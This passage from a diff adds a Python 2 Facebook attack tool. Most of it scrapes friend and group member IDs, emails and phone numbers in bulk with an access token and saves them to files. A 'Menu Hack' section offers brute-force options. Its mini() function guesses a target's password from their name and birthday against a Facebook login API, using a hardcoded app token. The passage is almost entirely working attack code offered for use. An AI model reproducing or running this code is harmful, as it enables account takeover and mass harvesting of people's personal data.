+		bz = open('out/id_teman.txt','w')
+		for a in z['data']:
+			idteman.append(a['id'])
+			bz.write(a['id'] + '\n')
+			print ("\r\033[1;97m[ \033[1;92m"+str(len(idteman))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+a['id']),;sys.stdout.flush();time.sleep(0.0001)
+		bz.close()
+		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSuccessfully get id \033[1;97m....'
+		print"\r\033[1;91m[+] \033[1;92mTotal ID \033[1;91m: \033[1;97m%s"%(len(idteman))
+		done = raw_input("\r\033[1;91m[+] \033[1;92mSave file with name\033[1;91m :\033[1;97m ")
+		os.rename('out/id_teman.txt','out/'+done)
+		print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)
+		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+		dump()
+	except IOError:
+		print"\033[1;91m[!] Error creating file"
+		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+		dump()
+	except (KeyboardInterrupt,EOFError):
+		print("\033[1;91m[!] Stopped")
+		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+		dump()
+	except KeyError:
+		print('\033[1;91m[!] Error')
+		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+		dump()
+	except requests.exceptions.ConnectionError:
+		print"\033[1;91m[✖] No connection"
+		keluar()
+
+##### ID FROM TEMAN #####
+def idfrom_teman():
+	os.system('reset')
+	try:
+		toket=open('login.txt','r').read()
+	except IOError:
+		print"\033[1;91m[!] Token not found"
+		os.system('rm -rf login.txt')
+		time.sleep(1)
+		login()
+	try:
+		os.mkdir('out')
+	except OSError:
+		pass
+	try:
+		os.system('reset')
+		print logo
+		idt = raw_input("\033[1;91m[+] \033[1;92mInput ID friend \033[1;91m: \033[1;97m")
+		try:
+			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
+			op = json.loads(jok.text)
+			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom\033[1;91m :\033[1;97m "+op["name"]
+		except KeyError:
+			print"\033[1;91m[!] Friend not found"
+			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+			dump()
+		r=requests.get("https://graph.facebook.com/"+idt+"?fields=friends.limit(5000)&access_token="+toket)
+		z=json.loads(r.text)
+		jalan('\033[1;91m[✺] \033[1;92mGet all friend id from friend \033[1;97m...')
+		print 42*"\033[1;97m═"
+		bz = open('out/id_teman_from_teman.txt','w')
+		for a in z['friends']['data']:
+			idfromteman.append(a['id'])
+			bz.write(a['id'] + '\n')
+			print ("\r\033[1;97m[ \033[1;92m"+str(len(idfromteman))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+a['id']),;sys.stdout.flush();time.sleep(0.0001)
+		bz.close()
+		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSuccessfully get id \033[1;97m....'
+		print"\r\033[1;91m[+] \033[1;92mTotal ID \033[1;91m: \033[1;97m%s"%(len(idfromteman))
+		done = raw_input("\r\033[1;91m[+] \033[1;92mSave file with name\033[1;91m :\033[1;97m ")
+		os.rename('out/id_teman_from_teman.txt','out/'+done)
+		print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)
+		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+		dump()
+	except IOError:
+		print"\033[1;91m[!] Error creating file"
+		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+		dump()
+	except (KeyboardInterrupt,EOFError):
+		print("\033[1;91m[!] Stopped")
+		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+		dump()
+	except KeyError:
+		print('\033[1;91m[!] Error')
+		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+		dump()
+	except requests.exceptions.ConnectionError:
+		print"\033[1;91m[✖] No connection"
+		keluar()
+
+##### ID FROM MEMBER GRUP #####
+def id_member_grup():
+	try:
+		toket=open('login.txt','r').read()
+	except IOError:
+		print"\033[1;91m[!] Token not found"
+		os.system('rm -rf login.txt')
+		time.sleep(1)
+		login()
+	try:
+		os.mkdir('out')
+	except OSError:
+		pass
+	try:
+		os.system('reset')
+		print logo
+		id=raw_input('\033[1;91m[+] \033[1;92mInput ID group \033[1;91m:\033[1;97m ')
+		try:
+			r=requests.get('https://graph.facebook.com/group/?id='+id+'&access_token='+toket)
+			asw=json.loads(r.text)
+			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom group \033[1;91m:\033[1;97m "+asw['name']
+		except KeyError:
+			print"\033[1;91m[!] Group not found"
+			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+			dump()
+		jalan('\033[1;91m[✺] \033[1;92mGet group member id \033[1;97m...')
+		print 42*"\033[1;97m═"
+		bz = open('out/member_grup.txt','w')
+		re=requests.get('https://graph.facebook.com/'+id+'/members?fields=name,id&limit=999999999&access_token='+toket)
+		s=json.loads(re.text)
+		for a in s['data']:
+			idmem.append(a['id'])
+			bz.write(a['id'] + '\n')
+			print ("\r\033[1;97m[ \033[1;92m"+str(len(idmem))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+a['id']),;sys.stdout.flush();time.sleep(0.0001)
+		bz.close()
+		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSuccessfully get id \033[1;97m....'
+		print"\r\033[1;91m[+] \033[1;92mTotal ID \033[1;91m: \033[1;97m%s"%(len(idmem))
+		done = raw_input("\r\033[1;91m[+] \033[1;92mSave file with name\033[1;91m :\033[1;97m ")
+		os.rename('out/member_grup.txt','out/'+done)
+		print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)
+		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+		dump()
+	except IOError:
+		print"\033[1;91m[!] Error creating file"
+		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+		dump()
+	except (KeyboardInterrupt,EOFError):
+		print("\033[1;91m[!] Stopped")
+		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+		dump()
+	except KeyError:
+		print('\033[1;91m[!] Error')
+		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+		dump()
+	except requests.exceptions.ConnectionError:
+		print"\033[1;91m[✖] No connection"
+		keluar()
+		
+##### EMAIL FROM GRUP #####
+def em_member_grup():
+	try:
+		toket=open('login.txt','r').read()
+	except IOError:
+		print"\033[1;91m[!] Token not found"
+		os.system('rm -rf login.txt')
+		time.sleep(1)
+		login()
+	try:
+		os.mkdir('out')
+	except OSError:
+		pass
+	try:
+		os.system('reset')
+		print logo
+		id=raw_input('\033[1;91m[+] \033[1;92mInput ID group \033[1;91m:\033[1;97m ')
+		try:
+			r=requests.get('https://graph.facebook.com/group/?id='+id+'&access_token='+toket)
+			asw=json.loads(r.text)
+			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom group \033[1;91m:\033[1;97m "+asw['name']
+		except KeyError:
+			print"\033[1;91m[!] Group not found"
+			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+			dump()
+		jalan('\033[1;91m[✺] \033[1;92mGet group member email \033[1;97m...')
+		print 42*"\033[1;97m═"
+		bz = open('out/em_member_grup.txt','w')
+		re=requests.get('https://graph.facebook.com/'+id+'/members?fields=name,id&limit=999999999&access_token='+toket)
+		s=json.loads(re.text)
+		for a in s['data']:
+			x = requests.get("https://graph.facebook.com/"+a['id']+"?access_token="+toket)
+			z = json.loads(x.text)
+			try:
+				emmem.append(z['email'])
+				bz.write(z['email'] + '\n')
+				print ("\r\033[1;97m[ \033[1;92m"+str(len(emmem))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+z['email']+" | "+z['name']+"\n"),;sys.stdout.flush();time.sleep(0.0001)
+			except KeyError:
+				pass
+		bz.close()
+		print 42*"\033[1;97m═"
+		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSuccessfully get email from member group \033[1;97m....'
+		print"\r\033[1;91m[+] \033[1;92mTotal Email \033[1;91m: \033[1;97m%s"%(len(emmem))
+		done = raw_input("\r\033[1;91m[+] \033[1;92mSave file with name\033[1;91m :\033[1;97m ")
+		os.rename('out/em_member_grup.txt','out/'+done)
+		print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)
+		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+		dump()
+	except IOError:
+		print"\033[1;91m[!] Error creating file"
+		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+		dump()
+	except (KeyboardInterrupt,EOFError):
+		print("\033[1;91m[!] Stopped")
+		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+		dump()
+	except KeyError:
+		print('\033[1;91m[!] Error')
+		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+		dump()
+	except requests.exceptions.ConnectionError:
+		print"\033[1;91m[✖] No connection"
+		keluar()
+		
+##### NOMER FROM GRUP #####
+def no_member_grup():
+	try:
+		toket=open('login.txt','r').read()
+	except IOError:
+		print"\033[1;91m[!] Token not found"
+		os.system('rm -rf login.txt')
+		time.sleep(1)
+		login()
+	try:
+		os.mkdir('out')
+	except OSError:
+		pass
+	try:
+		os.system('reset')
+		print logo
+		id=raw_input('\033[1;91m[+] \033[1;92mInput ID group \033[1;91m:\033[1;97m ')
+		try:
+			r=requests.get('https://graph.facebook.com/group/?id='+id+'&access_token='+toket)
+			asw=json.loads(r.text)
+			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom group \033[1;91m:\033[1;97m "+asw['name']
+		except KeyError:
+			print"\033[1;91m[!] Group not found"
+			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+			dump()
+		jalan('\033[1;91m[✺] \033[1;92mGet group member phone number \033[1;97m...')
+		print 42*"\033[1;97m═"
+		bz = open('out/no_member_grup.txt','w')
+		re=requests.get('https://graph.facebook.com/'+id+'/members?fields=name,id&limit=999999999&access_token='+toket)
+		s=json.loads(re.text)
+		for a in s['data']:
+			x = requests.get("https://graph.facebook.com/"+a['id']+"?access_token="+toket)
+			z = json.loads(x.text)
+			try:
+				nomem.append(z['mobile_phone'])
+				bz.write(z['mobile_phone'] + '\n')
+				print ("\r\033[1;97m[ \033[1;92m"+str(len(nomem))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+z['mobile_phone']+" | "+z['name']+"\n"),;sys.stdout.flush();time.sleep(0.0001)
+			except KeyError:
+				pass
+		bz.close()
+		print 42*"\033[1;97m═"
+		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSuccessfully get phone number from member group \033[1;97m....'
+		print"\r\033[1;91m[+] \033[1;92mTotal Number \033[1;91m: \033[1;97m%s"%(len(nomem))
+		done = raw_input("\r\033[1;91m[+] \033[1;92mSave file with name\033[1;91m :\033[1;97m ")
+		os.rename('out/no_member_grup.txt','out/'+done)
+		print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)
+		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+		dump()
+	except IOError:
+		print"\033[1;91m[!] Error creating file"
+		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+		dump()
+	except (KeyboardInterrupt,EOFError):
+		print("\033[1;91m[!] Stopped")
+		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+		dump()
+	except KeyError:
+		print('\033[1;91m[!] Error')
+		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+		dump()
+	except requests.exceptions.ConnectionError:
+		print"\033[1;91m[✖] No connection"
+		keluar()
+		
+##### EMAIL #####
+def email():
+	try:
+		toket=open('login.txt','r').read()
+	except IOError:
+		print"\033[1;91m[!] Token not found"
+		os.system('rm -rf login.txt')
+		time.sleep(1)
+		login()
+	try:
+		os.mkdir('out')
+	except OSError:
+		pass
+	try:
+		os.system('reset')
+		print logo
+		r = requests.get('https://graph.facebook.com/me/friends?access_token='+toket)
+		a = json.loads(r.text)
+		jalan('\033[1;91m[✺] \033[1;92mGet all friend email \033[1;97m...')
+		print 42*"\033[1;97m═"
+		bz = open('out/email_teman.txt','w')
+		for i in a['data']:
+			x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+toket)
+			z = json.loads(x.text)
+			try:
+				em.append(z['email'])
+				bz.write(z['email'] + '\n')
+				print ("\r\033[1;97m[ \033[1;92m"+str(len(em))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+z['email']+" | "+z['name']+"\n"),;sys.stdout.flush();time.sleep(0.0001)
+			except KeyError:
+				pass
+		bz.close()
+		print 42*"\033[1;97m═"
+		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSuccessfully get email \033[1;97m....'
+		print"\r\033[1;91m[+] \033[1;92mTotal Email \033[1;91m: \033[1;97m%s"%(len(em))
+		done = raw_input("\r\033[1;91m[+] \033[1;92mSave file with name\033[1;91m :\033[1;97m ")
+		os.rename('out/email_teman.txt','out/'+done)
+		print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)
+		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+		dump()
+	except IOError:
+		print"\033[1;91m[!] Error creating file"
+		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+		dump()
+	except (KeyboardInterrupt,EOFError):
+		print("\033[1;91m[!] Stopped")
+		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+		dump()
+	except KeyError:
+		print('\033[1;91m[!] Error')
+		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+		dump()
+	except requests.exceptions.ConnectionError:
+		print"\033[1;91m[✖] No connection"
+		keluar()
+
+##### EMAIL FROM TEMAN #####
+def emailfrom_teman():
+	os.system('reset')
+	try:
+		toket=open('login.txt','r').read()
+	except IOError:
+		print"\033[1;91m[!] Token not found"
+		os.system('rm -rf login.txt')
+		time.sleep(1)
+		login()
+	try:
+		os.mkdir('out')
+	except OSError:
+		pass
+	try:
+		os.system('reset')
+		print logo
+		idt = raw_input("\033[1;91m[+] \033[1;92mInput ID friend \033[1;91m: \033[1;97m")
+		try:
+			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
+			op = json.loads(jok.text)
+			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom\033[1;91m :\033[1;97m "+op["name"]
+		except KeyError:
+			print"\033[1;91m[!] Friend not found"
+			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+			dump()
+		r = requests.get('https://graph.facebook.com/'+idt+'/friends?access_token='+toket)
+		a = json.loads(r.text)
+		jalan('\033[1;91m[✺] \033[1;92mGet all friend email from friend \033[1;97m...')
+		print 42*"\033[1;97m═"
+		bz = open('out/em_teman_from_teman.txt','w')
+		for i in a['data']:
+			x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+toket)
+			z = json.loads(x.text)
+			try:
+				emfromteman.append(z['email'])
+				bz.write(z['email'] + '\n')
+				print ("\r\033[1;97m[ \033[1;92m"+str(len(emfromteman))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+z['email']+" | "+z['name']+"\n"),;sys.stdout.flush();time.sleep(0.0001)
+			except KeyError:
+				pass
+		bz.close()
+		print 42*"\033[1;97m═"
+		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSuccessfully get email \033[1;97m....'
+		print"\r\033[1;91m[+] \033[1;92mTotal Email \033[1;91m: \033[1;97m%s"%(len(emfromteman))
+		done = raw_input("\r\033[1;91m[+] \033[1;92mSave file with name\033[1;91m :\033[1;97m ")
+		os.rename('out/em_teman_from_teman.txt','out/'+done)
+		print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)
+		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+		dump()
+	except IOError:
+		print"\033[1;91m[!] Error creating file"
+		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+		dump()
+	except (KeyboardInterrupt,EOFError):
+		print("\033[1;91m[!] Stopped")
+		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+		dump()
+	except KeyError:
+		print('\033[1;91m[!] Error')
+		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+		dump()
+	except requests.exceptions.ConnectionError:
+		print"\033[1;91m[✖] No connection"
+		keluar()
+		
+##### NOMER #####
+def nomor_hp():
+	os.system('reset')
+	try:
+		toket=open('login.txt','r').read()
+	except IOError:
+		print"\033[1;91m[!] Token not found"
+		os.system('rm -rf login.txt')
+		time.sleep(1)
+		login()
+	try:
+		os.mkdir('out')
+	except OSError:
+		pass
+	try:
+		os.system('reset')
+		print logo
+		jalan('\033[1;91m[✺] \033[1;92mGet all friend number phone \033[1;97m...')
+		print 42*"\033[1;97m═"
+		url= "https://graph.facebook.com/me/friends?access_token="+toket
+		r =requests.get(url)
+		z=json.loads(r.text)
+		bz = open('out/nomer_teman.txt','w')
+		for n in z["data"]:
+			x = requests.get("https://graph.facebook.com/"+n['id']+"?access_token="+toket)
+			z = json.loads(x.text)
+			try:
+				hp.append(z['mobile_phone'])
+				bz.write(z['mobile_phone'] + '\n')
+				print ("\r\033[1;97m[ \033[1;92m"+str(len(hp))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+z['mobile_phone']+" | "+z['name']+"\n"),;sys.stdout.flush();time.sleep(0.0001)
+			except KeyError:
+				pass
+		bz.close()
+		print 42*"\033[1;97m═"
+		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSuccessfully get number \033[1;97m....'
+		print"\r\033[1;91m[+] \033[1;92mTotal Number \033[1;91m: \033[1;97m%s"%(len(hp))
+		done = raw_input("\r\033[1;91m[+] \033[1;92mSave file with name\033[1;91m :\033[1;97m ")
+		os.rename('out/nomer_teman.txt','out/'+done)
+		print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)
+		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+		dump()
+	except IOError:
+		print"\033[1;91m[!] Error creating file"
+		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+		dump()
+	except (KeyboardInterrupt,EOFError):
+		print("\033[1;91m[!] Stopped")
+		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+		dump()
+	except KeyError:
+		print('\033[1;91m[!] Error')
+		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+		dump()
+	except requests.exceptions.ConnectionError:
+		print"\033[1;91m[✖] No connection"
+		keluar()
+
+##### NOMER FROM TEMAN #####
+def hpfrom_teman():
+	os.system('reset')
+	try:
+		toket=open('login.txt','r').read()
+	except IOError:
+		print"\033[1;91m[!] Token not found"
+		os.system('rm -rf login.txt')
+		time.sleep(1)
+		login()
+	try:
+		os.mkdir('out')
+	except OSError:
+		pass
+	try:
+		os.system('reset')
+		print logo
+		idt = raw_input("\033[1;91m[+] \033[1;92mInput ID friend \033[1;91m: \033[1;97m")
+		try:
+			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
+			op = json.loads(jok.text)
+			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom\033[1;91m :\033[1;97m "+op["name"]
+		except KeyError:
+			print"\033[1;91m[!] Friend not found"
+			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+			dump()
+		r = requests.get('https://graph.facebook.com/'+idt+'/friends?access_token='+toket)
+		a = json.loads(r.text)
+		jalan('\033[1;91m[✺] \033[1;92mGet all friend number from friend \033[1;97m...')
+		print 42*"\033[1;97m═"
+		bz = open('out/no_teman_from_teman.txt','w')
+		for i in a['data']:
+			x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+toket)
+			z = json.loads(x.text)
+			try:
+				hpfromteman.append(z['mobile_phone'])
+				bz.write(z['mobile_phone'] + '\n')
+				print ("\r\033[1;97m[ \033[1;92m"+str(len(hpfromteman))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+z['mobile_phone']+" | "+z['name']+"\n"),;sys.stdout.flush();time.sleep(0.0001)
+			except KeyError:
+				pass
+		bz.close()
+		print 42*"\033[1;97m═"
+		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSuccessfully get number \033[1;97m....'
+		print"\r\033[1;91m[+] \033[1;92mTotal Number \033[1;91m: \033[1;97m%s"%(len(hpfromteman))
+		done = raw_input("\r\033[1;91m[+] \033[1;92mSave file with name\033[1;91m :\033[1;97m ")
+		os.rename('out/no_teman_from_teman.txt','out/'+done)
+		print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)
+		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+		dump()
+	except IOError:
+		print"\033[1;91m[!] Error creating file"
+		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+		dump()
+	except (KeyboardInterrupt,EOFError):
+		print("\033[1;91m[!] Stopped")
+		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+		dump()
+	except KeyError:
+		print('\033[1;91m[!] Error')
+		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+		dump()
+	except requests.exceptions.ConnectionError:
+		print"\033[1;91m[✖] No connection"
+		keluar()
+    
+##### MENU HACK #####
+def menu_hack():
+	os.system('reset')
+	try:
+		toket=open('login.txt','r').read()
+	except IOError:
+		print"\033[1;91m[!] Token not found"
+		os.system('rm -rf login.txt')
+		time.sleep(1)
+		login()
+	os.system('reset')
+	print logo
+	print "\033[1;93m║--\033[1;93m> \033[1;93m1.\033[1;94m Mini Hack Facebook(\033[1;92mTarget\033[1;97m)"
+	print "\033[1;93m║--\033[1;93m> \033[1;93m2.\033[1;94m Multi Bruteforce Facebook"
+	print "\033[1;93m║--\033[1;93m> \033[1;93m3.\033[1;94m Super Multi Bruteforce Facebook"
+	print "\033[1;93m║--\033[1;93m> \033[1;93m4.\033[1;94m BruteForce(\033[1;92mTarget\033[1;97m)"
+	print "\033[1;93m║--\033[1;93m> \033[1;93m5.\033[1;94m Yahoo Checker"
+	print "\033[1;93m║--\033[1;93m> \033[1;93m0.\033[1;94m Back"
+	print "║"
+	hack_pilih()
+#----pilih
+def hack_pilih():
+	hack = raw_input("\033[1;95m╚═\033[1;95mD \033[1;95m")
+	if hack=="":
+		print "\033[1;91m[!] Wrong input"
+		hack_pilih()
+	elif hack =="1":
+		mini()
+	elif hack =="2":
+		crack()
+		hasil()
+	elif hack =="3":
+		super()
+	elif hack =="4":
+		brute()
+	elif hack =="5":
+		menu_yahoo()
+	elif hack =="0":
+		menu()
+	else:
+		print "\033[1;91m[!] Wrong input"
+		hack_pilih()
+		
+##### MINI HF #####
+def mini():
+	os.system('reset')
+	try:
+		toket=open('login.txt','r').read()
+	except IOError:
+		print"\033[1;91m[!] Token not found"
+		os.system('rm -rf login.txt')
+		time.sleep(1)
+		login()
+	os.system('reset')
+	print logo
+	print "\033[1;97m[\033[1;91mINFO\033[1;97m] \033[1;91mThe target account must be friends\n       with your account first!"
+	print 42*"\033[1;97m═"
+	try:
+		id = raw_input("\033[1;91m[+] \033[1;92mTarget ID \033[1;91m:\033[1;97m ")
+		jalan('\033[1;91m[✺] \033[1;92mWait a minute \033[1;97m...')
+		r = requests.get("https://graph.facebook.com/"+id+"?access_token="+toket)
+		a = json.loads(r.text)
+		print '\033[1;91m[➹] \033[1;92mName\033[1;97m : '+a['name']
+		jalan('\033[1;91m[+] \033[1;92mCheck \033[1;97m...')
+		time.sleep(2)
+		jalan('\033[1;91m[+] \033[1;92mOpen password \033[1;97m...')
+		time.sleep(2)
+		print 42*"\033[1;97m═"
+		pz1 = a['first_name']+'123'
+		data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+		y = json.load(data)
+		if 'access_token' in y:
+			print "\033[1;91m[+] \033[1;92mFound"
+			print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
+			print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
+			print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz1
+			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+			menu_hack()
+		else:
+			if 'www.facebook.com' in y["error_msg"]:
+				print "\033[1;91m[+] \033[1;92mFound"
+				print "\033[1;91m[!] \033[1;93mAccount Checkpoint"
+				print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
+				print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
+				print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz1
+				raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+				menu_hack()
+			else:
+				pz2 = a['first_name'] + '12345'
+				data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+				y = json.load(data)
+				if 'access_token' in y:
+					print "\033[1;91m[+] \033[1;92mFound"
+					print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
+					print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
+					print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz2
+					raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+					menu_hack()
+				else:
+					if 'www.facebook.com' in y["error_msg"]:
+						print "\033[1;91m[+] \033[1;92mFound"
+						print "\033[1;91m[!] \033[1;93mAccount Checkpoint"
+						print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
+						print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
+						print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz2
+						raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+						menu_hack()
+					else:
+						pz3 = a['last_name'] + '123'
+						data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+						y = json.load(data)
+						if 'access_token' in y:
+							print "\033[1;91m[+] \033[1;92mFound"
+							print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
+							print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
+							print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz3
+							raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+							menu_hack()
+						else:
+							if 'www.facebook.com' in y["error_msg"]:
+								print "\033[1;91m[+] \033[1;92mFound"
+								print "\033[1;91m[!] \033[1;93mAccount Checkpoint"
+								print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
+								print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
+								print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz3
+								raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+								menu_hack()
+							else:
+								lahir = a['birthday']
+								pz4 = lahir.replace('/', '')
+								data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+								y = json.load(data)
+								if 'access_token' in y:
+									print "\033[1;91m[+] \033[1;92mFound"
+									print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
+									print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
+									print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz4
+									raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+									menu_hack()
+								else:
+									if 'www.facebook.com' in y["error_msg"]:
+										print "\033[1;91m[+] \033[1;92mFound"
+										print "\033[1;91m[!] \033[1;93mAccount Checkpoint"
+										print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
+										print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
+										print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz4
+										raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+										menu_hack()
+									else:
+										lahirs = a['birthday']
+										gaz = lahirs.replace('/', '')
+										pz5 = a['first_name']+gaz
+										data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+										y = json.load(data)
+										if 'access_token' in y:
+											print "\033[1;91m[+] \033[1;92mFound"
